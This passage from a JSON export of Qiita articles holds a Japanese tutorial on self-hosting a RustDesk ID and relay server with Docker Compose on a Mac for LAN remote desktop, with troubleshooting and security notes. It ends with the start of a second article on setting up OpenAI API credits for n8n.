href=\"#1-port-is-already-allocated-%E3%82%A8%E3%83%A9%E3%83%BC\"><i class=\"fa fa-link\"></i></a>1. <code>port is already allocated</code> エラー</h3>\n<p data-sourcepos=\"204:1-204:88\"><strong>原因:</strong> 既にポートが他プロセス/コンテナにより占有されている</p>\n<p data-sourcepos=\"206:1-206:11\"><strong>対処:</strong></p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"208:1-213:3\"><div class=\"highlight\"><pre><code>docker ps <span class=\"nt\">-a</span>\ndocker <span class=\"nb\">rm</span> <span class=\"nt\">-f</span> rustdesk-hbbr rustdesk-hbbs\n<span class=\"c\"># 占有プロセスを確認</span>\nlsof <span class=\"nt\">-i</span> :21117\n</code></pre></div></div>\n<div data-sourcepos=\"215:1-217:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"216:1-216:126\">hbbsで21114-21119を一括公開するとhbbrの21117と競合するため、ポートは個別に公開してください。</p>\n</div>\n</div>\n<h3 data-sourcepos=\"219:1-219:43\">\n<span id=\"2-コンテナ内で鍵が読めない\" class=\"fragment\"></span><a href=\"#2-%E3%82%B3%E3%83%B3%E3%83%86%E3%83%8A%E5%86%85%E3%81%A7%E9%8D%B5%E3%81%8C%E8%AA%AD%E3%82%81%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>2. コンテナ内で鍵が読めない</h3>\n<p data-sourcepos=\"221:1-221:51\"><strong>症状:</strong> <code>cat</code> コマンドが見つからない</p>\n<p data-sourcepos=\"223:1-223:33\"><strong>対処:</strong> <code>docker cp</code> を使用</p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"225:1-227:3\"><div class=\"highlight\"><pre><code>docker <span class=\"nb\">cp </span>rustdesk-hbbs:/root/id_ed25519.pub ./id_ed25519.pub\n</code></pre></div></div>\n<h3 data-sourcepos=\"229:1-229:50\">\n<span id=\"3-failed-to-connect-to-ip21116-エラー\" class=\"fragment\"></span><a href=\"#3-failed-to-connect-to-ip21116-%E3%82%A8%E3%83%A9%E3%83%BC\"><i class=\"fa fa-link\"></i></a>3. <code>Failed to connect to &lt;IP&gt;:21116</code> エラー</h3>\n<p data-sourcepos=\"231:1-231:79\"><strong>原因:</strong> 指定したIPが間違っている（ゲートウェイIPなど）</p>\n<p data-sourcepos=\"233:1-233:11\"><strong>対処:</strong></p>\n<div class=\"code-frame\" data-lang=\"bash\" data-sourcepos=\"235:1-238:3\"><div class=\"highlight\"><pre><code><span class=\"c\"># 実際のサーバ IP を確認</span>\nipconfig getifaddr en0\n</code></pre></div></div>\n<h3 data-sourcepos=\"240:1-240:34\">\n<span id=\"4-test-netconnectionが失敗\" class=\"fragment\"></span><a href=\"#4-test-netconnection%E3%81%8C%E5%A4%B1%E6%95%97\"><i class=\"fa fa-link\"></i></a>4. Test-NetConnectionが失敗</h3>\n<p data-sourcepos=\"242:1-242:74\"><strong>原因:</strong> macOSファイアウォールがDockerの受信をブロック</p>\n<p data-sourcepos=\"244:1-245:153\"><strong>対処:</strong><br>\nシステム設定 &gt; ネットワーク &gt; ファイアウォール &gt; オプション で <code>Docker Desktop</code> / <code>com.docker.backend</code> を受信許可に設定</p>\n<h3 data-sourcepos=\"247:1-247:45\">\n<span id=\"5-疎通は通るがrustdesk接続失敗\" class=\"fragment\"></span><a href=\"#5-%E7%96%8E%E9%80%9A%E3%81%AF%E9%80%9A%E3%82%8B%E3%81%8Crustdesk%E6%8E%A5%E7%B6%9A%E5%A4%B1%E6%95%97\"><i class=\"fa fa-link\"></i></a>5. 疎通は通るがRustDesk接続失敗</h3>\n<p data-sourcepos=\"249:1-249:100\"><strong>原因:</strong> Keyの貼り付けミス（改行/空白混入）、またはNetwork設定のApply忘れ</p>\n<p data-sourcepos=\"251:1-251:83\"><strong>対処:</strong> <code>id_ed25519.pub</code> を再取得し、1行全選択で貼り直してApply</p>\n<h3 data-sourcepos=\"253:1-253:53\">\n<span id=\"6-macで画面が見えない操作できない\" class=\"fragment\"></span><a href=\"#6-mac%E3%81%A7%E7%94%BB%E9%9D%A2%E3%81%8C%E8%A6%8B%E3%81%88%E3%81%AA%E3%81%84%E6%93%8D%E4%BD%9C%E3%81%A7%E3%81%8D%E3%81%AA%E3%81%84\"><i class=\"fa fa-link\"></i></a>6. Macで画面が見えない/操作できない</h3>\n<p data-sourcepos=\"255:1-255:66\"><strong>原因:</strong> Macのアクセス制御設定が完了していない</p>\n<p data-sourcepos=\"257:1-257:11\"><strong>対処:</strong></p>\n<ol data-sourcepos=\"258:1-262:0\">\n<li data-sourcepos=\"258:1-258:20\">RustDeskを終了</li>\n<li data-sourcepos=\"259:1-259:73\">システム設定 &gt; プライバシーとセキュリティ を開く</li>\n<li data-sourcepos=\"260:1-260:120\">\n<strong>画面収録（Screen Recording）</strong> と <strong>アクセシビリティ（Accessibility）</strong> で「RustDesk」をオン</li>\n<li data-sourcepos=\"261:1-262:0\">無い場合は「+」ボタンで <code>/Applications/RustDesk.app</code> を追加</li>\n</ol>\n<h2 data-sourcepos=\"263:1-263:45\">\n<span id=\"トラブルシューティングフロー\" class=\"fragment\"></span><a href=\"#%E3%83%88%E3%83%A9%E3%83%96%E3%83%AB%E3%82%B7%E3%83%A5%E3%83%BC%E3%83%86%E3%82%A3%E3%83%B3%E3%82%B0%E3%83%95%E3%83%AD%E3%83%BC\"><i class=\"fa fa-link\"></i></a>トラブルシューティングフロー</h2>\n<iframe id=\"qiita-embed-content__19db93baad23718c39c9aa3b3488d5f6\" src=\"https://qiita.com/embed-contents/mermaid#qiita-embed-content__19db93baad23718c39c9aa3b3488d5f6\" style=\"width:100%;\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" data-content='{\"data\":\"flowchart TD\\n A[接続失敗] --&gt; B{サーバ IP 正しい?}\\n B -- No --&gt; B1[ipconfig getifaddr en0&lt;br/&gt;で実 IP を取得]\\n B -- Yes --&gt; C{ポート疎通 OK?}\\n C -- No --&gt; C1[macOS FW 設定確認&lt;br/&gt;Docker を受信許可]\\n C -- Yes --&gt; D{Key 正しい?}\\n D -- No --&gt; D1[docker cp で&lt;br/&gt;id_ed25519.pub 取得し直し]\\n D -- Yes --&gt; E{hbbs/hbbr 起動中?}\\n E -- No --&gt; E1[docker compose ps/logs 確認]\\n E -- Yes --&gt; F{21117 競合?}\\n F -- Yes --&gt; F1[hbbs のポートを個別化]\\n F -- No --&gt; G[クライアント再起動]\",\"key\":\"fd2a1cb98fc19e951a89fb543c03ce05\"}'>\n</iframe>\n\n<h2 data-sourcepos=\"280:1-280:21\">\n<span id=\"運用コマンド\" class=\"fragment\"></span><a href=\"#%E9%81%8B%E7%94%A8%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\"><i class=\"fa fa-link\"></i></a>運用コマンド</h2>\n<table data-sourcepos=\"282:1-288:70\">\n<thead>\n<tr data-sourcepos=\"282:1-282:25\">\n<th data-sourcepos=\"282:2-282:9\">操作</th>\n<th data-sourcepos=\"282:11-282:24\">コマンド</th>\n</tr>\n</thead>\n<tbody>\n<tr data-sourcepos=\"284:1-284:35\">\n<td data-sourcepos=\"284:2-284:9\">起動</td>\n<td data-sourcepos=\"284:11-284:34\"><code>docker compose up -d</code></td>\n</tr>\n<tr data-sourcepos=\"285:1-285:34\">\n<td data-sourcepos=\"285:2-285:9\">停止</td>\n<td data-sourcepos=\"285:11-285:33\"><code>docker compose down</code></td>\n</tr>\n<tr data-sourcepos=\"286:1-286:40\">\n<td data-sourcepos=\"286:2-286:12\">再起動</td>\n<td data-sourcepos=\"286:14-286:39\"><code>docker compose restart</code></td>\n</tr>\n<tr data-sourcepos=\"287:1-287:57\">\n<td data-sourcepos=\"287:2-287:15\">ログ確認</td>\n<td data-sourcepos=\"287:17-287:56\"><code>docker logs rustdesk-hbbs --tail 100</code></td>\n</tr>\n<tr data-sourcepos=\"288:1-288:70\">\n<td data-sourcepos=\"288:2-288:21\">イメージ更新</td>\n<td data-sourcepos=\"288:23-288:69\"><code>docker compose pull &amp;&amp; docker compose up -d</code></td>\n</tr>\n</tbody>\n</table>\n<h2 data-sourcepos=\"290:1-290:39\">\n<span id=\"セキュリティに関する注意\" class=\"fragment\"></span><a href=\"#%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E6%B3%A8%E6%84%8F\"><i class=\"fa fa-link\"></i></a>セキュリティに関する注意</h2>\n<ul data-sourcepos=\"292:1-295:0\">\n<li data-sourcepos=\"292:1-292:138\">公開鍵（<code>id_ed25519.pub</code>）は共有しても問題ありませんが、秘密鍵（<code>id_ed25519</code>）は絶対に共有しないこと</li>\n<li data-sourcepos=\"293:1-293:71\">無人アクセスを使う場合は強固なパスワードを設定</li>\n<li data-sourcepos=\"294:1-295:0\">\n<strong>外部公開は本手順の対象外</strong>です。行う場合は TLS + リバースプロキシ構成を検討してください</li>\n</ul>\n<h2 data-sourcepos=\"296:1-296:12\">\n<span id=\"まとめ\" class=\"fragment\"></span><a href=\"#%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>まとめ</h2>\n<ul data-sourcepos=\"298:1-302:0\">\n<li data-sourcepos=\"298:1-298:69\">RustDeskの自前サーバはDocker Composeで簡単に構築可能</li>\n<li data-sourcepos=\"299:1-299:69\">LAN 内運用であれば証明書や外部ポート開放は不要</li>\n<li data-sourcepos=\"300:1-300:96\">クライアント設定では<strong>IPのみ</strong>（ポート指定不要）と<strong>公開鍵</strong>を設定</li>\n<li data-sourcepos=\"301:1-302:0\">macOSのファイアウォールとアクセス制御設定に注意</li>\n</ul>\n<h2 data-sourcepos=\"303:1-303:18\">\n<span id=\"参考リンク\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83%E3%83%AA%E3%83%B3%E3%82%AF\"><i class=\"fa fa-link\"></i></a>参考リンク</h2>\n<ul data-sourcepos=\"305:1-307:62\">\n<li data-sourcepos=\"305:1-305:51\"><a href=\"https://rustdesk.com/\" rel=\"nofollow noopener\" target=\"_blank\">RustDesk 公式サイト</a></li>\n<li data-sourcepos=\"306:1-306:83\"><a href=\"https://hub.docker.com/r/rustdesk/rustdesk-server\" rel=\"nofollow noopener\" target=\"_blank\">RustDesk Server - Docker Hub</a></li>\n<li data-sourcepos=\"307:1-307:62\"><a href=\"https://rustdesk.com/docs/en/\" rel=\"nofollow noopener\" target=\"_blank\">RustDesk ドキュメント</a></li>\n</ul>\n",
      "body": "\n## はじめに\n\nRustDeskのhbbs/hbbrをDocker Composeで常駐させ、同一LAN内からクライアントで接続するための手順をまとめました。\n\nRustDeskはTeamViewerやAnyDeskのようなリモートデスクトップツールですが、自前でサーバを立てることで外部サービスに依存せずに利用できます。\n\n:::note\n筆者はWindowsにサーバを立てて、Mac、WindowsにRustDeskを導入し、どこからでも接続できるようにしています。\n:::\n\n## アーキテクチャ\n\n### 役割とポート\n\n| サーバ | 役割 | ポート |\n|--------|------|--------|\n| **hbbs** | ID / rendezvous server | TCP 21115（ID登録）, TCP/UDP 21116（シグナリング/NATテスト）, TCP 21114/21118（付随機能） |\n| **hbbr** | relay server | TCP 21117（中継） |\n\n### 構成図\n\n```\n┌─────────────────────────────────────────────────┐\n│              LAN (192.168.x.0/24)               │\n│                                                 │\n│  ┌─────────────┐      ┌─────────────────────┐  │\n│  │   Windows   │      │   Mac (Server)      │  │\n│  │   Client    │◄────►│   Docker Desktop    │  │\n│  └─────────────┘      │   ├─ hbbs           │  │\n│                       │   └─ hbbr           │  │\n│  ┌─────────────┐      └─────────────────────┘  │\n│  │  Mac/Linux  │               ▲               │\n│  │   Client    │───────────────┘               │\n│  └─────────────┘                               │\n└─────────────────────────────────────────────────┘\n```\n\n### 鍵管理\n\nhbbs初回起動時に `id_ed25519.pub`（公開鍵）が生成されます。クライアントのNetwork設定にこの鍵を貼り付けて認証します。\n\n## 前提条件\n\n- サーバ用PCにDockerがインストール済み\n- サーバのLAN IPを把握している\n- ファイアウォールで以下ポートの通過を許可\n  - 21115/TCP\n  - 21116/TCP & UDP\n  - 21117/TCP\n- クライアントにRustDeskがインストール済み\n\n## Docker Compose 設定\n\n### ファイル作成\n\n```bash\nmkdir -p ~/rustdesk-server\ncd ~/rustdesk-server\n```\n\n`docker-compose.yml`を以下の内容で作成します。\n\n:::note warn\nCompose v2では`version`フィールドは省略推奨（警告回避）\n:::\n\n```yaml\nservices:\n  hbbs:\n    image: rustdesk/rustdesk-server\n    container_name: rustdesk-hbbs\n    restart: unless-stopped\n    volumes:\n      - rustdesk-data:/root\n    ports:\n      - \"21114:21114\"\n      - \"21115:21115\"\n      - \"21116:21116\"\n      - \"21116:21116/udp\"\n    command: hbbs\n\n  hbbr:\n    image: rustdesk/rustdesk-server\n    container_name: rustdesk-hbbr\n    restart: unless-stopped\n    volumes:\n      - rustdesk-data:/root\n    ports:\n      - \"21117:21117\"\n    command: hbbr\n\nvolumes:\n  rustdesk-data:\n```\n\n## サーバセットアップ手順\n\n### 1. 起動と状態確認\n\n```bash\ndocker compose up -d\ndocker compose ps\n```\n\nログ確認:\n\n```bash\ndocker logs rustdesk-hbbs --tail 50\ndocker logs rustdesk-hbbr --tail 50\n```\n\n### 2. 公開鍵（Key）の取得\n\n```bash\ndocker cp rustdesk-hbbs:/root/id_ed25519.pub ./id_ed25519.pub\ncat ./id_ed25519.pub\n```\n\n:::note alert\n表示された1行をクライアント設定のKeyに貼り付けます。**改行・空白を混入させないこと。**\n:::\n\n### 3. サーバのLAN IP確認\n\n```bash\nipconfig getifaddr en0\n```\n\nWi-Fi/有線でインターフェイスが異なる場合は`en1`などに読み替えてください。\n\n## クライアントインストール\n\n### Mac\n\n```bash\nbrew install --cask rustdesk\n```\n\n### Windows\n\n```powershell\nwinget install rustdesk.rustdesk\n```\n\nまたは[公式サイト](https://rustdesk.com/)からインストーラをダウンロード。\n\n## クライアント設定\n\nRustDeskを起動し、**Settings > Network > Unlock** から以下を設定します。\n\n| 項目 | 設定値 |\n|------|--------|\n| **ID Server** | サーバのLAN IP（例: `192.168.1.100`）※ポート指定不要 |\n| **Relay Server** | 同上 |\n| **Key** | `id_ed25519.pub`の内容（公開鍵全文、1行） |\n\n### 無人アクセス設定（推奨）\n\n接続される側で **Settings > Security > Unattended Access** を有効化し、強固なパスワードを設定しておくと、承諾操作なしで接続できます。\n\n## 接続確認\n\n### Windows からの疎通確認\n\n```powershell\nTest-NetConnection <サーバIP> -Port 21116   # hbbs\nTest-NetConnection <サーバIP> -Port 21117   # hbbr\n```\n\n### 接続フロー\n\n1. 接続される側のRustDeskを起動しIDを表示\n2. 接続する側のRustDeskで相手のIDを入力して接続\n3. 初回は接続される側で「承諾」、または無人アクセスのパスワードで入室\n\n## 接続シーケンス\n\n```mermaid\nsequenceDiagram\n  participant Client as クライアント\n  participant hbbs as hbbs (ID)\n  participant hbbr as hbbr (Relay)\n  participant Host as 接続先ホスト\n\n  Client->>hbbs: 登録/シグナリング (TCP/UDP 21116)\n  Host->>hbbs: 登録/シグナリング (TCP/UDP 21116)\n  hbbs-->>Client: ピア情報/経路指示\n  hbbs-->>Host: ピア情報/経路指示\n  alt P2P 可能\n    Client-->>Host: 直接接続（NAT 穴あけ）\n  else P2P 不可\n    Client->>hbbr: 接続要求 (TCP 21117)\n    Host->>hbbr: 接続確立 (TCP 21117)\n    hbbr-->>Client: リレー転送\n    hbbr-->>Host: リレー転送\n  end\n```\n\n## トラブルシューティング\n\n### 1. `port is already allocated` エラー\n\n**原因:** 既にポートが他プロセス/コンテナにより占有されている\n\n**対処:**\n\n```bash\ndocker ps -a\ndocker rm -f rustdesk-hbbr rustdesk-hbbs\n# 占有プロセスを確認\nlsof -i :21117\n```\n\n:::note info\nhbbsで21114-21119を一括公開するとhbbrの21117と競合するため、ポートは個別に公開してください。\n:::\n\n### 2. コンテナ内で鍵が読めない\n\n**症状:** `cat` コマンドが見つからない\n\n**対処:** `docker cp` を使用\n\n```bash\ndocker cp rustdesk-hbbs:/root/id_ed25519.pub ./id_ed25519.pub\n```\n\n### 3. `Failed to connect to <IP>:21116` エラー\n\n**原因:** 指定したIPが間違っている（ゲートウェイIPなど）\n\n**対処:**\n\n```bash\n# 実際のサーバ IP を確認\nipconfig getifaddr en0\n```\n\n### 4. Test-NetConnectionが失敗\n\n**原因:** macOSファイアウォールがDockerの受信をブロック\n\n**対処:**\nシステム設定 > ネットワーク > ファイアウォール > オプション で `Docker Desktop` / `com.docker.backend` を受信許可に設定\n\n### 5. 疎通は通るがRustDesk接続失敗\n\n**原因:** Keyの貼り付けミス（改行/空白混入）、またはNetwork設定のApply忘れ\n\n**対処:** `id_ed25519.pub` を再取得し、1行全選択で貼り直してApply\n\n### 6. Macで画面が見えない/操作できない\n\n**原因:** Macのアクセス制御設定が完了していない\n\n**対処:**\n1. RustDeskを終了\n2. システム設定 > プライバシーとセキュリティ を開く\n3. **画面収録（Screen Recording）** と **アクセシビリティ（Accessibility）** で「RustDesk」をオン\n4. 無い場合は「+」ボタンで `/Applications/RustDesk.app` を追加\n\n## トラブルシューティングフロー\n\n```mermaid\nflowchart TD\n  A[接続失敗] --> B{サーバ IP 正しい?}\n  B -- No --> B1[ipconfig getifaddr en0<br/>で実 IP を取得]\n  B -- Yes --> C{ポート疎通 OK?}\n  C -- No --> C1[macOS FW 設定確認<br/>Docker を受信許可]\n  C -- Yes --> D{Key 正しい?}\n  D -- No --> D1[docker cp で<br/>id_ed25519.pub 取得し直し]\n  D -- Yes --> E{hbbs/hbbr 起動中?}\n  E -- No --> E1[docker compose ps/logs 確認]\n  E -- Yes --> F{21117 競合?}\n  F -- Yes --> F1[hbbs のポートを個別化]\n  F -- No --> G[クライアント再起動]\n```\n\n## 運用コマンド\n\n| 操作 | コマンド |\n|------|----------|\n| 起動 | `docker compose up -d` |\n| 停止 | `docker compose down` |\n| 再起動 | `docker compose restart` |\n| ログ確認 | `docker logs rustdesk-hbbs --tail 100` |\n| イメージ更新 | `docker compose pull && docker compose up -d` |\n\n## セキュリティに関する注意\n\n- 公開鍵（`id_ed25519.pub`）は共有しても問題ありませんが、秘密鍵（`id_ed25519`）は絶対に共有しないこと\n- 無人アクセスを使う場合は強固なパスワードを設定\n- **外部公開は本手順の対象外**です。行う場合は TLS + リバースプロキシ構成を検討してください\n\n## まとめ\n\n- RustDeskの自前サーバはDocker Composeで簡単に構築可能\n- LAN 内運用であれば証明書や外部ポート開放は不要\n- クライアント設定では**IPのみ**（ポート指定不要）と**公開鍵**を設定\n- macOSのファイアウォールとアクセス制御設定に注意\n\n## 参考リンク\n\n- [RustDesk 公式サイト](https://rustdesk.com/)\n- [RustDesk Server - Docker Hub](https://hub.docker.com/r/rustdesk/rustdesk-server)\n- [RustDesk ドキュメント](https://rustdesk.com/docs/en/)\n",
      "coediting": false,
      "comments_count": 0,
      "created_at": "2025-12-09T14:13:34+09:00",
      "group": null,
      "id": "5eebcedcc2f8473ed7b2",
      "likes_count": 0,
      "private": false,
      "reactions_count": 0,
      "stocks_count": 0,
      "tags": [
        {
          "name": "Mac",
          "versions": []
        },
        {
          "name": "Docker",
          "versions": []
        },
        {
          "name": "docker-compose",
          "versions": []
        },
        {
          "name": "リモートデスクトップ",
          "versions": []
        },
        {
          "name": "rustdesk",
          "versions": []
        }
      ],
      "title": "【RustDesk】Mac上にDocker Composeで自前サーバを構築し、LAN内でリモートデスクトップ環境を作る",
      "updated_at": "2025-12-09T14:13:34+09:00",
      "url": "https://qiita.com/izutani/items/5eebcedcc2f8473ed7b2",
      "user": {
        "description": null,
        "facebook_id": null,
        "followees_count": 0,
        "followers_count": 0,
        "github_login_name": "izoizo2000",
        "id": "izutani",
        "items_count": 12,
        "linkedin_id": null,
        "location": null,
        "name": "",
        "organization": null,
        "permanent_id": 3562533,
        "profile_image_url": "https://s3-ap-northeast-1.amazonaws.com/qiita-image-store/0/3562533/06ec78d2a7e72e63184695327f0b1c5c5a7c32d9/large.png?1739935183",
        "team_only": false,
        "twitter_screen_name": "izo614",
        "website_url": null
      },
      "page_views_count": null,
      "team_membership": null,
      "organization_url_name": null,
      "slide": false,
      "_source": "trending_by_likes"
    },
    {
      "rendered_body": "<p data-sourcepos=\"1:1-1:59\">n8nでOpenAI APIと連携し、ChatGPTを使用する手順</p>\n<div data-sourcepos=\"3:1-6:3\" class=\"note info\">\n<span class=\"fa fa-fw fa-check-circle\"></span><div>\n<p data-sourcepos=\"4:1-5:74\">n8nからChatGPTを使用するには2025年12月現在、無料ではできませんでした。<br>\nOpenAI APIのクレジットを購入する必要があります。($5～)</p>\n</div>\n</div>\n<h2 data-sourcepos=\"8:1-8:28\">\n<span id=\"openai-apiキーの取得\" class=\"fragment\"></span><a href=\"#openai-api%E3%82%AD%E3%83%BC%E3%81%AE%E5%8F%96%E5%BE%97\"><i class=\"fa fa-link\"></i></a>OpenAI APIキーの取得</h2>\n<p data-sourcepos=\"9:1-10:42\">OpenAIアカウントを作成し、APIキーを取得する。<br>\n既に取得済みの場合はスキップ</p>\n<p data-sourcepos=\"12:1-13:41\">・OpenAI Platformにアクセス<br>\n<a href=\"https://platform.openai.com/docs/overview\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://platform.openai.com/docs/overview</a></p>\n<p data-sourcepos=\"15:1-15:37\">・右上の「Sign up」から登録</p>\n<p data-sourcepos=\"17:1-17:48\">・Organization作成で名称と属性を設定</p>\n<p data-sourcepos=\"19:1-19:155\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F640254e4-a54b-4b54-b12c-08e9fedb975a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b2fe9f0a700649ab711136c72d9daa25\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F640254e4-a54b-4b54-b12c-08e9fedb975a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b2fe9f0a700649ab711136c72d9daa25\" alt=\"open_ai_platform_1_create_organization.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F640254e4-a54b-4b54-b12c-08e9fedb975a.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=259e88f7836d22bc34a08cad6a6b72ef 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/640254e4-a54b-4b54-b12c-08e9fedb975a.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"21:1-21:51\">・Organizationに招待する人がいれば招待</p>\n<p data-sourcepos=\"23:1-24:72\">・APIのキー名とプロジェクト名を設定<br>\nn8nで使用しているのがわかる名称で良いと思います。</p>\n<p data-sourcepos=\"26:1-26:156\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fe32ec9ba-3114-436f-bcd8-b817cac2ba50.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9aa32fd9e3e79db02d2a27a15ca967c4\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fe32ec9ba-3114-436f-bcd8-b817cac2ba50.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9aa32fd9e3e79db02d2a27a15ca967c4\" alt=\"open_ai_platform_2_setting_api_key_name.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fe32ec9ba-3114-436f-bcd8-b817cac2ba50.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=01f8fe8ac40d6b61a7f59fdec7d6bbc8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/e32ec9ba-3114-436f-bcd8-b817cac2ba50.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"28:1-28:51\">・キーが表示されるのでメモしておく</p>\n<p data-sourcepos=\"30:1-30:147\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F75712b5d-7853-4af6-a923-0df57dd35da9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7eb08d6e86b263dc9d948c1b464f0c40\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F75712b5d-7853-4af6-a923-0df57dd35da9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=7eb08d6e86b263dc9d948c1b464f0c40\" alt=\"open_ai_platform_3_get_api_key.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2F75712b5d-7853-4af6-a923-0df57dd35da9.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=81a8b42c1b21bef17a8f650edbaa4b96 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/75712b5d-7853-4af6-a923-0df57dd35da9.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"32:1-33:29\">・クレジットの購入は「I'll buy credits later」をクリックし後ほど<br>\n※ここで購入してもOK</p>\n<p data-sourcepos=\"35:1-35:152\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc4e06b6f-fab3-4f0c-948f-666a8ae7a47c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=87cc4d1bebe78a858d4add23800e24b7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc4e06b6f-fab3-4f0c-948f-666a8ae7a47c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=87cc4d1bebe78a858d4add23800e24b7\" alt=\"open_ai_platform_4_purchase_credits.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Fc4e06b6f-fab3-4f0c-948f-666a8ae7a47c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=c2d4176e46ebfaeba2db29a9494f2645 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4230449/c4e06b6f-fab3-4f0c-948f-666a8ae7a47c.png\" loading=\"lazy\"></a></p>\n<h2 data-sourcepos=\"37:1-37:57\">\n<span id=\"openaiのクレジット購入と予算上限を設定\" class=\"fragment\"></span><a href=\"#openai%E3%81%AE%E3%82%AF%E3%83%AC%E3%82%B8%E3%83%83%E3%83%88%E8%B3%BC%E5%85%A5%E3%81%A8%E4%BA%88%E7%AE%97%E4%B8%8A%E9%99%90%E3%82%92%E8%A8%AD%E5%AE%9A\"><i class=\"fa fa-link\"></i></a>OpenAIのクレジット購入と予算上限を設定</h2>\n<p data-sourcepos=\"38:1-39:126\">現在は無料枠がなく、クレジットを購入しないと使用できないよう。<br>\nクレジットの購入と使いすぎて料金が高くなってしまわないように予算の上限を設定します。</p>\n<h3 data-sourcepos=\"41:1-41:34\">\n<span id=\"openaiのクレジット購入\" class=\"fragment\"></span><a href=\"#openai%E3%81%AE%E3%82%AF%E3%83%AC%E3%82%B8%E3%83%83%E3%83%88%E8%B3%BC%E5%85%A5\"><i class=\"fa fa-link\"></i></a>OpenAIのクレジット購入</h3>\n<p data-sourcepos=\"42:1-44:56\">・OpenAI Platformのlimitsの設定を開く<br>\n下記リンクから開けます。<br>\n<a href=\"https://platform.openai.com/settings/organization/limits\" class=\"autolink\" rel=\"nofollow noopener\" target=\"_blank\">https://platform.openai.com/settings/organization/limits</a></p>\n<p data-sourcepos=\"46:1-46:35\">・「Buy credits」をクリック</p>\n<p data-sourcepos=\"48:1-48:155\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff0ad602f-34c0-419a-90d5-31574fc7beaa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=52bca8f67f81fce64a13430bf8c1fad5\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4230449%2Ff0ad602f-34c0-419a-90d5-31574fc7beaa.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=52bca8f67f81fce64a13430bf8c1fad5\" alt=\"open_ai_platform_credit_limit_1_limits.png\" 